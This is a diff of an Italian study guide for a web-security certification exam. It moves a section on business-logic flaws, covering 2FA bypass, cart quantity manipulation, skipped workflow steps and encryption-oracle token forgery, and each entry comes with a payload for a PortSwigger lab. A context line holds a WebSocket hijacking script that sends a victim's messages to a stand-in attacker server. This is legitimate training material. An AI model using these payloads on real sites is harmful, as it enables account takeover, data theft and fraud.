@@ -1057,6 +1057,83 @@ Quando l'input passa per un parser (es. XML) o è filtrato da un WAF: offusca il
 - Step: 2
 
 
+## Business logic vulnerabilities — Stage tipico: 2
+
+**Come riconoscerla (generale):** nessun pattern fisso di payload — bisogna capire il flusso/le regole di business dell'app e cercare assunzioni implicite su input, sequenza di step, o fiducia eccessiva in controlli client-side; testare con valori anomali (negativi, enormi, mancanti), saltando step di un workflow, o rimuovendo parametri uno alla volta.
+
+### A. Fiducia eccessiva nei controlli client-side
+
+**1. Logica 2FA difettosa (bypass tramite manipolazione parametri)**
+
+- Segnale: dopo il login, l'app richiede un codice 2FA associato a un parametro (es. `username` nel form del codice) che potrebbe essere manipolabile indipendentemente dalla sessione autenticata al primo fattore.
+- Soluzione: durante l'inserimento del codice 2FA, modificare il parametro che identifica l'utente target (es. `username=altro-utente`) mantenendo la propria sessione; se l'app non verifica la corrispondenza, si può bypassare il 2FA di un altro utente forzando un codice (es. via brute-force a 4 cifre).
+- Payload: nella richiesta di verifica 2FA, cambiare `username=vittima` lasciando il proprio `mfa-code` o bruteforzando il codice a 4 cifre della vittima
+- Link: [2FA broken logic](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic)
+- Step: 2
+
+### B. Gestione di input non convenzionali
+
+**2. Logic flaw di basso livello (valori numerici non convenzionali)**
+
+- Segnale: un campo numerico (es. quantità in un carrello) non valida correttamente limiti superiori/inferiori o segno.
+- Soluzione: inserire un valore negativo o estremamente alto nel campo quantità/importo per manipolare il calcolo totale a proprio favore (es. un prezzo negativo che riduce il totale sotto zero).
+- Payload: `quantity=-15` su un articolo costoso, in modo che il totale del carrello risulti negativo/scontato
+- Link: [Low-level logic flaw](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level)
+- Step: 2
+
+**3. Gestione incoerente di input eccezionali**
+
+- Segnale: diverse parti dell'app gestiscono lo stesso tipo di input anomalo (es. quantità molto grande) in modo incoerente tra loro (una valida, l'altra non lo fa correttamente).
+- Soluzione: identificare la funzione che gestisce l'input anomalo in modo meno rigoroso e usarla per raggiungere uno stato non previsto che un'altra funzione più permissiva sfrutterà a proprio vantaggio.
+- Payload: es. impostare una quantità enorme (`quantity=999999999`) che causa un overflow/wraparound nel calcolo del totale, portandolo a un valore basso o negativo
+- Link: [Inconsistent handling of exceptional input](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input)
+- Step: 2
+
+### C. Assunzioni errate sul comportamento dell'utente
+
+**4. Isolamento debole su un endpoint a doppio uso (dual-use endpoint)**
+
+- Segnale: lo stesso endpoint server-side gestisce più funzioni diverse in base alla presenza/assenza di certi parametri (es. cambio email vs cambio password nello stesso form "update").
+- Soluzione: rimuovere selettivamente parametri da una richiesta multiuso per raggiungere un percorso di codice non previsto (es. rimuovere la verifica della password corrente lasciando solo il cambio email, permettendo di modificare anche altri campi sensibili senza autenticazione aggiuntiva).
+- Payload: richiesta di update profilo con solo `email=attacker@evil.com` omettendo `current-password`, se l'endpoint gestisce entrambe le funzioni condizionalmente
+- Link: [Weak isolation on dual-use endpoint](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint)
+- Step: 2
+
+**5. Validazione insufficiente del workflow (sequenza di step)**
+
+- Segnale: un processo multi-step (es. checkout: carrello → conferma → pagamento) non verifica che ogni step sia stato completato nell'ordine corretto.
+- Soluzione: usare il "forced browsing" per saltare direttamente a uno step successivo (es. la pagina di conferma ordine) senza aver completato gli step precedenti richiesti (es. il pagamento), ottenendo l'effetto finale (es. ordine confermato) senza aver soddisfatto le condizioni.
+- Payload: navigare direttamente a `/cart/checkout/confirmation` saltando `/cart/checkout/payment`
+- Link: [Insufficient workflow validation](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation)
+- Step: 2
+
+**6. Bypass dell'autenticazione via state machine difettosa**
+
+- Segnale: un flusso di login a più step (es. login → verifica 2FA → accesso) non verifica rigorosamente che ogni step precedente sia stato completato con successo prima di concedere l'accesso allo step finale.
+- Soluzione: identificare quale richiesta nello stato finale del flusso concede effettivamente l'accesso (es. settaggio del cookie di sessione autenticata) e inviarla direttamente, saltando gli step intermedi (es. l'inserimento del codice 2FA).
+- Payload: ripetere/forzare la richiesta finale del flusso di login (es. `GET /my-account` dopo aver ottenuto solo parzialmente l'autenticazione) senza completare lo step di verifica
+- Link: [Authentication bypass via flawed state machine](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine)
+- Step: 2
+
+### D. Difetti specifici del dominio ed encryption oracle
+
+**7. Logic flaw "infinite money" (sconti/promozioni manipolabili)**
+
+- Segnale: uno sconto/promozione viene applicato in base a una condizione (es. spesa minima) che può essere soddisfatta temporaneamente e poi modificata senza invalidare lo sconto.
+- Soluzione: raggiungere la soglia richiesta per lo sconto (es. aggiungere articoli fino a superare l'importo minimo), applicare lo sconto/coupon, poi rimuovere articoli dal carrello mantenendo lo sconto già applicato, ottenendo un prezzo finale molto inferiore a quello previsto.
+- Payload: aggiungere articoli per superare la soglia di sconto → applicare il coupon → rimuovere articoli dal carrello prima del checkout finale
+- Link: [Infinite money logic flaw](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money)
+- Step: 2
+
+**8. Bypass dell'autenticazione via encryption oracle**
+
+- Segnale: una funzionalità dell'app cifra dati controllabili dall'utente e restituisce il ciphertext (es. come parametro cookie), mentre un'altra funzionalità sensibile (es. "ricordami"/reset password) si aspetta dati cifrati con lo stesso algoritmo/chiave.
+- Soluzione: usare la funzionalità che agisce da "oracolo di cifratura" per cifrare un payload di propria scelta (es. un token di autenticazione per un altro utente), poi inserire il ciphertext ottenuto nel parametro sensibile dell'altra funzionalità per impersonare la vittima.
+- Payload: usare l'oracolo per cifrare una stringa strutturata come il token di sessione/reset (es. `administrator|<timestamp-futuro>`), poi inviarla come valore del cookie/parametro di autenticazione
+- Link: [Authentication bypass via encryption oracle](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle)
+- Step: 2
+
+
 # Stage 3 — Data exfiltration (esecuzione codice ed estrazione dati)
 
 Categorie tipicamente usate per eseguire codice o estrarre dati una volta scalati ad admin. Ordine conforme a [botesjuan/...](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study) (sezione "Data Exfiltration").
@@ -1413,83 +1490,6 @@ Non presenti nel repository di riferimento botesjuan (o non mappabili a un singo
 - Soluzione: creare una pagina HTML malevola ospitata sul proprio dominio che, al caricamento, apre una connessione WebSocket cross-site verso l'app vulnerabile (il browser della vittima invierà automaticamente i cookie di sessione); la pagina può poi inviare messaggi per eseguire azioni o intercettare messaggi di risposta contenenti dati sensibili.
 - Payload: pagina HTML con script `<script>var ws = new WebSocket('wss://TARGET/chat'); ws.onmessage = function(event) { fetch('https://TUO-SERVER/log?data=' + event.data); }; ws.onopen = function() { ws.send('READY'); };</script>`
 - Link: [Cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)
-- Step: 2
-
-
-## Business logic vulnerabilities — Stage tipico: 2
-
-**Come riconoscerla (generale):** nessun pattern fisso di payload — bisogna capire il flusso/le regole di business dell'app e cercare assunzioni implicite su input, sequenza di step, o fiducia eccessiva in controlli client-side; testare con valori anomali (negativi, enormi, mancanti), saltando step di un workflow, o rimuovendo parametri uno alla volta.
-
-### A. Fiducia eccessiva nei controlli client-side
-
-**1. Logica 2FA difettosa (bypass tramite manipolazione parametri)**
-
-- Segnale: dopo il login, l'app richiede un codice 2FA associato a un parametro (es. `username` nel form del codice) che potrebbe essere manipolabile indipendentemente dalla sessione autenticata al primo fattore.
-- Soluzione: durante l'inserimento del codice 2FA, modificare il parametro che identifica l'utente target (es. `username=altro-utente`) mantenendo la propria sessione; se l'app non verifica la corrispondenza, si può bypassare il 2FA di un altro utente forzando un codice (es. via brute-force a 4 cifre).
-- Payload: nella richiesta di verifica 2FA, cambiare `username=vittima` lasciando il proprio `mfa-code` o bruteforzando il codice a 4 cifre della vittima
-- Link: [2FA broken logic](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic)
-- Step: 2
-
-### B. Gestione di input non convenzionali
-
-**2. Logic flaw di basso livello (valori numerici non convenzionali)**
-
-- Segnale: un campo numerico (es. quantità in un carrello) non valida correttamente limiti superiori/inferiori o segno.
-- Soluzione: inserire un valore negativo o estremamente alto nel campo quantità/importo per manipolare il calcolo totale a proprio favore (es. un prezzo negativo che riduce il totale sotto zero).
-- Payload: `quantity=-15` su un articolo costoso, in modo che il totale del carrello risulti negativo/scontato
-- Link: [Low-level logic flaw](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level)
-- Step: 2
-
-**3. Gestione incoerente di input eccezionali**
-
-- Segnale: diverse parti dell'app gestiscono lo stesso tipo di input anomalo (es. quantità molto grande) in modo incoerente tra loro (una valida, l'altra non lo fa correttamente).
-- Soluzione: identificare la funzione che gestisce l'input anomalo in modo meno rigoroso e usarla per raggiungere uno stato non previsto che un'altra funzione più permissiva sfrutterà a proprio vantaggio.
-- Payload: es. impostare una quantità enorme (`quantity=999999999`) che causa un overflow/wraparound nel calcolo del totale, portandolo a un valore basso o negativo
-- Link: [Inconsistent handling of exceptional input](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input)
-- Step: 2
-
-### C. Assunzioni errate sul comportamento dell'utente
-
-**4. Isolamento debole su un endpoint a doppio uso (dual-use endpoint)**
-
-- Segnale: lo stesso endpoint server-side gestisce più funzioni diverse in base alla presenza/assenza di certi parametri (es. cambio email vs cambio password nello stesso form "update").
-- Soluzione: rimuovere selettivamente parametri da una richiesta multiuso per raggiungere un percorso di codice non previsto (es. rimuovere la verifica della password corrente lasciando solo il cambio email, permettendo di modificare anche altri campi sensibili senza autenticazione aggiuntiva).
-- Payload: richiesta di update profilo con solo `email=attacker@evil.com` omettendo `current-password`, se l'endpoint gestisce entrambe le funzioni condizionalmente
-- Link: [Weak isolation on dual-use endpoint](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint)
-- Step: 2
-
-**5. Validazione insufficiente del workflow (sequenza di step)**
-
-- Segnale: un processo multi-step (es. checkout: carrello → conferma → pagamento) non verifica che ogni step sia stato completato nell'ordine corretto.
-- Soluzione: usare il "forced browsing" per saltare direttamente a uno step successivo (es. la pagina di conferma ordine) senza aver completato gli step precedenti richiesti (es. il pagamento), ottenendo l'effetto finale (es. ordine confermato) senza aver soddisfatto le condizioni.
-- Payload: navigare direttamente a `/cart/checkout/confirmation` saltando `/cart/checkout/payment`
-- Link: [Insufficient workflow validation](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation)
-- Step: 2
-
-**6. Bypass dell'autenticazione via state machine difettosa**
-
-- Segnale: un flusso di login a più step (es. login → verifica 2FA → accesso) non verifica rigorosamente che ogni step precedente sia stato completato con successo prima di concedere l'accesso allo step finale.
-- Soluzione: identificare quale richiesta nello stato finale del flusso concede effettivamente l'accesso (es. settaggio del cookie di sessione autenticata) e inviarla direttamente, saltando gli step intermedi (es. l'inserimento del codice 2FA).
-- Payload: ripetere/forzare la richiesta finale del flusso di login (es. `GET /my-account` dopo aver ottenuto solo parzialmente l'autenticazione) senza completare lo step di verifica
-- Link: [Authentication bypass via flawed state machine](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine)
-- Step: 2
-
-### D. Difetti specifici del dominio ed encryption oracle
-
-**7. Logic flaw "infinite money" (sconti/promozioni manipolabili)**
-
-- Segnale: uno sconto/promozione viene applicato in base a una condizione (es. spesa minima) che può essere soddisfatta temporaneamente e poi modificata senza invalidare lo sconto.
-- Soluzione: raggiungere la soglia richiesta per lo sconto (es. aggiungere articoli fino a superare l'importo minimo), applicare lo sconto/coupon, poi rimuovere articoli dal carrello mantenendo lo sconto già applicato, ottenendo un prezzo finale molto inferiore a quello previsto.
-- Payload: aggiungere articoli per superare la soglia di sconto → applicare il coupon → rimuovere articoli dal carrello prima del checkout finale
-- Link: [Infinite money logic flaw](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money)
-- Step: 2
-
-**8. Bypass dell'autenticazione via encryption oracle**
-
-- Segnale: una funzionalità dell'app cifra dati controllabili dall'utente e restituisce il ciphertext (es. come parametro cookie), mentre un'altra funzionalità sensibile (es. "ricordami"/reset password) si aspetta dati cifrati con lo stesso algoritmo/chiave.
-- Soluzione: usare la funzionalità che agisce da "oracolo di cifratura" per cifrare un payload di propria scelta (es. un token di autenticazione per un altro utente), poi inserire il ciphertext ottenuto nel parametro sensibile dell'altra funzionalità per impersonare la vittima.
-- Payload: usare l'oracolo per cifrare una stringa strutturata come il token di sessione/reset (es. `administrator|<timestamp-futuro>`), poi inviarla come valore del cookie/parametro di autenticazione
-- Link: [Authentication bypass via encryption oracle](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle)
 - Step: 2
 
 
